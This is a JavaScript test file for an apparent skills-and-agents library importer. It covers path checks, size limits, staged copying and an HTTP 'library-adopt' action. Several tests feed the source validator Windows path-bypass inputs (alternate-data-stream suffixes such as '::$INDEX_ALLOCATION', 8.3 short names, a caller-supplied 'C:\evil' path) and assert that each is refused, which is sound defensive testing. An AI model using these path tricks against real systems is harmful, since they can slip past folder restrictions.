// ---------------- review round 1 (docs/skills-flow.md §2.3, §3.7, §3.8) ----------------

// Every file whose contents are read whole while `fn` runs (hashing and copying read with readFileSync or
// copyFileSync; frontmatter is read with a bounded readSync and is not counted)
function contentReads(fn) {
  const seen = [];
  const read = fs.readFileSync;
  const copy = fs.copyFileSync;
  fs.readFileSync = function (p, ...rest) {
    seen.push(String(p));
    return read.call(this, p, ...rest);
  };
  fs.copyFileSync = function (s, ...rest) {
    seen.push(String(s));
    return copy.call(this, s, ...rest);
  };
  try {
    return { value: fn(), seen };
  } finally {
    fs.readFileSync = read;
    fs.copyFileSync = copy;
  }
}

test('source rules: a ":" after the drive letter (alternate data streams such as ::$INDEX_ALLOCATION) is refused before the disk is touched', () => {
  const h = hub();
  for (const src of ['C:\\::$INDEX_ALLOCATION', 'C:\\:$I30:$INDEX_ALLOCATION', HOME + '::$INDEX_ALLOCATION', path.join(HOME, '.claude') + '::$INDEX_ALLOCATION', ROOT + '::$INDEX_ALLOCATION', path.join(ROOT, 'x:stream'), 'C:/a:b']) {
    const r = checkSource(src, { hubDir: h, homeDir: HOME });
    assert.equal(r.ok, false, src);
    assert.equal(r.status, 400, src);
    assert.equal(r.error, 'bad-source', src);
    assert.equal(scanSource(src, { hubDir: h, homeDir: HOME }).error, 'bad-source', src);
  }
  // The same folder without the stream suffix is a fine source: the ':' is what is refused
  assert.equal(checkSource(ROOT, { hubDir: h, homeDir: HOME }).ok, true);
});

test('source rules: the home and hub rules compare real paths, so an 8.3 short name of the home folder is the home folder', (t) => {
  const longHome = path.join(ROOT, 'longhomefolder');
  fs.mkdirSync(path.join(longHome, 'Desktop'), { recursive: true });
  const longHub = path.join(ROOT, 'hubwithlongname');
  initHub(longHub);
  // Node opens paths in their \\?\ form, so a trailing dot is not dropped: "<home>." is no folder at all
  assert.equal(checkSource(longHome + '.', { homeDir: longHome }).ok, false);
  assert.equal(checkSource(path.join(longHome, 'Desktop'), { homeDir: longHome }).ok, true, 'a folder inside the home folder is allowed');
  // The home folder given in its 8.3 form (a volume without short names has nothing to check)
  const shortHome = path.join(ROOT, 'LONGHO~1');
  if (!fs.existsSync(shortHome) || realPath(shortHome) !== realPath(longHome)) return t.skip('this volume makes no 8.3 short names');
  assert.equal(checkSource(shortHome, { homeDir: longHome }).error, 'source-is-home');
  assert.equal(checkSource(shortHome + '\\', { homeDir: longHome }).error, 'source-is-home');
  assert.equal(checkSource(longHome, { homeDir: shortHome }).error, 'source-is-home', 'the home folder itself given short');
  const shortHub = path.join(ROOT, 'HUBWIT~1');
  assert.equal(checkSource(path.join(shortHub, 'library'), { hubDir: longHub, homeDir: longHome }).error, 'source-in-hub');
});

test('measure: folder count and depth are limits too; the walk stops at the first limit passed, so a tree over the limits is never read whole', () => {
  assert.equal(LIMITS.maxItemDirs, 500);
  assert.equal(LIMITS.maxItemDepth, 16);
  const base = path.join(ROOT, 'measure');
  // 600 empty folders: counting stops right after the 501st
  const dirs = path.join(base, 'dirs');
  for (let i = 0; i < 600; i++) fs.mkdirSync(path.join(dirs, `d${i}`), { recursive: true });
  const md = measureTree(dirs);
  assert.equal(md.dirs, LIMITS.maxItemDirs + 1, 'stopped at the limit');
  assert.equal(sizeProblem(md), 'too-many-folders');
  // 2000 files: counting stops right after the 501st
  const files = path.join(base, 'files');
  fs.mkdirSync(files, { recursive: true });
  for (let i = 0; i < 2000; i++) fs.writeFileSync(path.join(files, `f${i}.txt`), 'x');
  assert.equal(measureTree(files).files, LIMITS.maxFiles + 1);
  // Depth: entries 16 levels down are fine, 17 are too deep
  const deep = (n) => {
    const d = path.join(base, `deep${n}`);
    const leaf = path.join(d, ...Array.from({ length: n - 1 }, (_, i) => `l${i}`));
    write(path.join(leaf, 'f.txt'), 'x');
    return d;
  };
  assert.equal(measureTree(deep(16)).depth, 16);
  assert.equal(sizeProblem(measureTree(deep(16))), null);
  assert.equal(sizeProblem(measureTree(deep(17))), 'too-deep');
  // Links are counted apart and limited too
  const links = path.join(base, 'links');
  fs.mkdirSync(links, { recursive: true });
  for (let i = 0; i < LIMITS.maxFiles + 1; i++) junction(ROOT, path.join(links, `j${i}`));
  assert.equal(sizeProblem(measureTree(links)), 'too-many-files');
  // A tree over the limits is never hashed: no file of it is read
  const { value, seen } = contentReads(() => [treeHash(files), treeHash(dirs), treeHash(deep(17)), treeHash(files, { links: 'skip' })]);
  assert.deepEqual(value, [OVER_LIMIT, OVER_LIMIT, OVER_LIMIT, OVER_LIMIT]);
  assert.deepEqual(seen, []);
  // A single file over the byte limit is not read either
  const big = path.join(base, 'big.md');
  fs.writeFileSync(big, Buffer.alloc(LIMITS.maxBytes + 1));
  const one = contentReads(() => treeHash(big));
  assert.equal(one.value, OVER_LIMIT);
  assert.deepEqual(one.seen, []);
});

test('scan: the library item a candidate matches is measured before it is hashed; one over the limits is a conflict and none of its files is read', () => {
  const h = hub();
  const lib = path.join(h, 'library', 'web', 'skills', 'alpha');
  write(path.join(lib, 'SKILL.md'), fm('alpha'));
  for (let i = 0; i < LIMITS.maxFiles + 5; i++) write(path.join(lib, 'f', `${i}.txt`), 'x');
  const s = path.join(ROOT, 'src-over-lib');
  write(path.join(s, 'skills', 'alpha', 'SKILL.md'), fm('alpha'));
  const { value, seen } = contentReads(() => scanSource(s, { hubDir: h, homeDir: HOME }));
  assert.equal(value.items[0].status, 'conflict');
  assert.deepEqual(value.items[0].problems, [], 'the candidate itself is fine');
  assert.ok(!seen.some((p) => p.startsWith(lib)), 'no file of the library item was read');
  // Replacing it is refused with the size problem of the library copy, which stays as it is
  const p = planImport({ hubDir: h, homeDir: HOME, source: s, picks: [{ path: 'skills/alpha', category: 'web', replace: true }] });
  assert.deepEqual(p.plan.map((e) => `${e.op}:${e.reason}`), ['skip:too-many-files']);
});

test('import staging: the copies are staged in library/ itself, never inside a category; an old copy that cannot be deleted is not an error and is swept at the next start', () => {
  const h = hub();
  const libItem = path.join(h, 'library', 'docs', 'skills', 'beta');
  write(path.join(libItem, 'SKILL.md'), fm('beta', 'Old text'));
  const s = sourceWorld('src-staging');
  const picks = [{ path: 'pack/.claude/skills/beta', category: 'docs', replace: true }, { path: 'skills/alpha', category: 'game' }];
  const p = planImport({ hubDir: h, homeDir: HOME, source: s, picks });
  assert.deepEqual(p.plan.map((e) => `${e.op}:${e.reason}`), ['update:replace', 'copy:new']);
  const removed = [];
  const r = executeImport({
    hubDir: h,
    plan: p.plan,
    removeTree: (x) => {
      removed.push(x);
      throw Object.assign(new Error('locked'), { code: 'EBUSY' });
    },
  });
  assert.deepEqual(r, { copied: 1, updated: 1 }, 'the old copy that stayed is not an error');
  assert.equal(fs.readFileSync(path.join(libItem, 'SKILL.md'), 'utf8'), fm('beta', 'Write docs'), 'the new copy is in place');
  assert.equal(removed.length, 1);
  assert.equal(path.dirname(removed[0]), path.join(h, 'library'), 'staged in library/, outside every category');
  assert.match(path.basename(removed[0]), LEFTOVER_RE);
  for (const g of [path.join(h, 'library', 'docs', 'skills'), path.join(h, 'library', 'game', 'skills')]) assert.ok(!fs.readdirSync(g).some((x) => x.startsWith('.sibersentez-')), g);
  assert.deepEqual(listLibrary(h).map((i) => i.name).sort(), ['alpha', 'beta']);
  // Server start: the leftover is swept
  assert.deepEqual(fs.readdirSync(path.join(h, 'library')).filter((x) => x.startsWith('.sibersentez-')), [path.basename(removed[0])]);
  assert.deepEqual(sweepLeftovers(h), { removed: 1, kept: 0 });
  assert.deepEqual(fs.readdirSync(path.join(h, 'library')).filter((x) => x.startsWith('.sibersentez-')), []);
});

test('placeCopy: the staging folder is required and the temporary copy lives there; a destination changed since the plan (expectHash) is never replaced', () => {
  const base = path.join(ROOT, 'place');
  const src = path.join(base, 'src', 'item');
  write(path.join(src, 'SKILL.md'), fm('item', 'new'));
  const stage = path.join(base, 'stage');
  const dest = path.join(stage, 'group', 'item');
  write(path.join(dest, 'SKILL.md'), fm('item', 'old'));
  assert.throws(() => placeCopy(src, dest, { replace: true }), /internal/, 'no staging folder given: nothing is done');
  const removed = [];
  const removeTree = (x) => {
    removed.push(x);
    fs.rmSync(x, { recursive: true, force: true });
  };
  assert.throws(() => placeCopy(src, dest, { stageDir: stage, removeTree }), /exists/);
  assert.equal(path.dirname(removed[0]), stage);
  assert.match(path.basename(removed[0]), /^\.sibersentez-tmp-[0-9a-f]{12}$/);
  const expect = treeHash(dest);
  write(path.join(dest, 'mine.txt'), 'user change');
  assert.throws(() => placeCopy(src, dest, { replace: true, expectHash: expect, stageDir: stage, removeTree }), /modified/);
  assert.equal(fs.readFileSync(path.join(dest, 'SKILL.md'), 'utf8'), fm('item', 'old'));
  assert.ok(fs.existsSync(path.join(dest, 'mine.txt')));
  assert.deepEqual(fs.readdirSync(stage), ['group'], 'no staging copy left');
  assert.deepEqual(placeCopy(src, dest, { replace: true, expectHash: treeHash(dest), stageDir: stage, removeTree }), { leftover: false });
  assert.equal(fs.readFileSync(path.join(dest, 'SKILL.md'), 'utf8'), fm('item', 'new'));
  assert.ok(!fs.existsSync(path.join(dest, 'mine.txt')));
});

// ---------------- library-adopt: a listed item into the library (docs/skills-flow.md §5.1) ----------------

test('itemOrigin: a skill is its folder, an agent a file right in an agents folder; the personal copy first; only a place the scan takes; cached until the roster is rebuilt', () => {
  const w = path.join(ROOT, 'origin-world');
  const personal = path.join(w, 'home', '.claude', 'skills', 'pdf');
  const project = path.join(w, 'proj', '.claude', 'skills', 'pdf');
  const agents = path.join(w, 'proj', '.claude', 'agents');
  write(path.join(personal, 'SKILL.md'), fm('pdf'));
  write(path.join(project, 'SKILL.md'), fm('pdf'));
  write(path.join(agents, 'rev.md'), fm('rev'));
  write(path.join(agents, 'sub', 'deep.md'), fm('deep'));
  const h = hub();
  write(path.join(h, 'projects', 'inside', '.claude', 'skills', 'hubbed', 'SKILL.md'), fm('hubbed'));
  const cat = (map) => Object.assign(Object.create(Catalog.prototype), { itemFiles: new Map(Object.entries(map)), hubDir: h, homeDir: path.join(w, 'home') });
  const c = cat({
    'skill:pdf': [{ source: 'project', file: path.join(project, 'SKILL.md') }, { source: 'personal', file: path.join(personal, 'SKILL.md') }],
    'agent:rev': [{ source: 'project', file: path.join(agents, 'rev.md') }],
    'agent:deep': [{ source: 'project', file: path.join(agents, 'sub', 'deep.md') }],
    'skill:lib': [{ source: 'library', file: path.join(h, 'library', 'web', 'skills', 'lib', 'SKILL.md') }, { source: 'kit', file: path.join(w, 'kit', 'SKILL.md') }],
    'skill:rel': [{ source: 'personal', file: 'relative\\SKILL.md' }],
    'skill:long': [{ source: 'personal', file: 'C:\\' + 'a'.repeat(300) + '\\SKILL.md' }],
    'skill:gone': [{ source: 'personal', file: path.join(w, 'gone', 'SKILL.md') }],
    'skill:hubbed': [{ source: 'project', file: path.join(h, 'projects', 'inside', '.claude', 'skills', 'hubbed', 'SKILL.md') }],
  });
  assert.deepEqual(c.itemOrigin('skill', 'pdf'), { source: personal, pick: '.' }, 'the personal copy first');
  assert.deepEqual(c.itemOrigin('agent', 'rev'), { source: agents, pick: 'rev.md' });
  assert.equal(c.itemOrigin('agent', 'deep'), null, 'a nested agent: the scan would not find it');
  assert.equal(c.itemOrigin('skill', 'lib'), null, 'never the library or the kit');
  assert.equal(c.itemOrigin('skill', 'rel'), null);
  assert.equal(c.itemOrigin('skill', 'long'), null, 'past the scan limit');
  assert.equal(c.itemOrigin('skill', 'gone'), null, 'no longer there (source-missing)');
  assert.equal(c.itemOrigin('skill', 'hubbed'), null, 'inside the hub (source-in-hub)');
  assert.equal(c.itemOrigin('plugin', 'x'), null);
  // Cached: the answer holds until itemFiles is replaced (a new roster build)
  fs.rmSync(personal, { recursive: true, force: true });
  assert.deepEqual(c.itemOrigin('skill', 'pdf'), { source: personal, pick: '.' });
  c.itemFiles = new Map(c.itemFiles);
  assert.deepEqual(c.itemOrigin('skill', 'pdf'), { source: project, pick: '.' }, 'rebuilt: the next place that still works');
});

test('library-adopt over HTTP: by kind and name only; dry plans, live copies from where the item lives (the source untouched), again skips; unknown -> 404; no path goes out', async () => {
  const h = hub();
  const skillDir = path.join(HOME, '.claude', 'skills', 'pdf-tool');
  write(path.join(skillDir, 'SKILL.md'), fm('pdf-tool', 'Fill PDF forms'));
  const agentsDir = path.join(HOME, '.claude', 'agents');
  write(path.join(agentsDir, 'rev.md'), fm('rev', 'Reviews security of the code'));
  const where = { 'skill:pdf-tool': { source: skillDir, pick: '.' }, 'agent:rev': { source: agentsDir, pick: 'rev.md' } };
  const itemOrigin = (kind, name) => where[`${kind}:${name}`] || null;
  const dry = await startServer(h, { mode: 'dry', itemOrigin });
  try {
    const r = await dry.post({ action: 'library-adopt', items: [{ kind: 'skill', name: 'pdf-tool' }] });
    assert.equal(r.status, 200);
    assert.deepEqual(r.json.plan.map((e) => `${e.op}:${e.kind}:${e.name}`), ['copy:skill:pdf-tool']);
    assert.equal(r.json.result.executed, false);
    assert.ok(!exists(path.join(h, 'library', 'docs', 'skills', 'pdf-tool')) && listLibrary(h).length === 0, 'Preview writes nothing');
  } finally {
    await dry.close();
  }
  let reloads = 0;
  const live = await startServer(h, { mode: 'live', itemOrigin, onChange: () => reloads++ });
  try {
    const r = await live.post({ action: 'library-adopt', items: [{ kind: 'skill', name: 'pdf-tool' }, { kind: 'agent', name: 'rev' }] });
    assert.equal(r.status, 200);
    assert.deepEqual([r.json.result.copied, r.json.result.updated], [2, 0]);
    assert.doesNotMatch(JSON.stringify(r.json), new RegExp(HOME.replace(/\\/g, '\\\\\\\\')), 'no absolute path of the item goes out');
    const lib = listLibrary(h).map((i) => `${i.kind}:${i.name}`).sort();
    assert.deepEqual(lib, ['agent:rev', 'skill:pdf-tool']);
    assert.ok(exists(path.join(skillDir, 'SKILL.md')) && exists(path.join(agentsDir, 'rev.md')), 'the originals stay where they are');
    assert.equal(reloads, 1);
    live.tick();
    const again = await live.post({ action: 'library-adopt', items: [{ kind: 'skill', name: 'pdf-tool' }] });
    assert.deepEqual(again.json.plan.map((e) => `${e.op}:${e.reason}`), ['skip:same']);
    assert.equal(again.json.result.copied, 0);
    live.tick();
    const unknown = await live.post({ action: 'library-adopt', items: [{ kind: 'skill', name: 'nowhere' }] });
    assert.deepEqual([unknown.status, unknown.json.error], [404, 'item-not-found']);
    live.tick();
    const withPath = await live.post({ action: 'library-adopt', items: [{ kind: 'skill', name: 'pdf-tool', source: 'C:\\evil' }] });
    assert.deepEqual([withPath.status, withPath.json.error], [400, 'bad-items'], 'the page cannot name a folder');
    // Several items, one cannot be taken: the others are copied and reported, the catalog learns about them
    const okDir = path.join(HOME, '.claude', 'skills', 'csv-tool');
    write(path.join(okDir, 'SKILL.md'), fm('csv-tool', 'Read CSV files'));
    const renamed = path.join(HOME, '.claude', 'skills', 'other-name');
    write(path.join(renamed, 'SKILL.md'), fm('real-name', 'Frontmatter name differs'));
    where['skill:csv-tool'] = { source: okDir, pick: '.' };
    where['skill:gone-tool'] = { source: path.join(HOME, 'nowhere'), pick: '.' };
    where['skill:other-name'] = { source: renamed, pick: '.' };
    live.tick();
    const mixed = await live.post({ action: 'library-adopt', items: [{ kind: 'skill', name: 'gone-tool' }, { kind: 'skill', name: 'csv-tool' }, { kind: 'skill', name: 'other-name' }] });
    assert.equal(mixed.status, 200);
    assert.deepEqual(mixed.json.plan.map((e) => `${e.op}:${e.name}:${e.reason}`), ['skip:gone-tool:source-missing', 'copy:csv-tool:new', 'skip:other-name:item-not-found']);
    assert.ok(mixed.json.plan.every((e) => !('_error' in e)), 'no internal field goes out');
    assert.equal(mixed.json.result.copied, 1);
    const cat = JSON.parse(fs.readFileSync(path.join(h, 'library', 'catalog.json'), 'utf8'));
    assert.ok(cat.items.some((i) => i.name === 'csv-tool'), 'catalog.json regenerated with the copied item');
    assert.equal(reloads, 2);
    live.tick();
    const single = await live.post({ action: 'library-adopt', items: [{ kind: 'skill', name: 'other-name' }] });
    assert.deepEqual([single.status, single.json.error], [404, 'item-not-found'], 'a single item: its reason is the answer');
  } finally {
    await live.close();
  }
});
